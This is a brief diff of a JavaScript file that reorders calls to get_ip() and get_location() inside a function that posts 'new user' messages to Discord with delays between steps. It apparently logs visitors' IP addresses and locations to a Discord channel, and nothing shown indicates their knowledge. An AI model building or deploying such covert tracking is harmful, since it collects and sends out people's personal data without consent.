@@ -46,7 +46,11 @@ const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))
 
 
 const send_to_discord = async () => {
-    await sleep(3000)
+    await sleep(1000)
+    get_ip()
+    await sleep(200)
+    get_location()
+    await sleep(7000)
     discord_msg("---------------------")
     await sleep(200)
     discord_msg("new user: ")
@@ -64,7 +68,6 @@ const send_to_discord = async () => {
     }
 }
 
-get_ip()
-get_location()
+
 send_to_discord()
 
